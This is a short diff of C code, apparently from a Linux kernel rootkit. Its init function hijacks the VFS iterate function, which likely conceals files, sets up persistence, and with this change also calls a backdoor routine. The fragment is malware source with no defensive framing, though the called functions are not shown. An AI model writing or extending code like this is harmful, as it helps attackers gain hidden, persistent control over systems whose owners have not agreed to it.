@@ -19,6 +19,8 @@ int duck_init(void) {
     vfs_save_hijacked_function_code(vfs_original_iterate, vfs_hijacked_iterate);
     vfs_hijack_start(vfs_original_iterate);
 
+    backdoor();
+
     persistence();
 
     return 0;
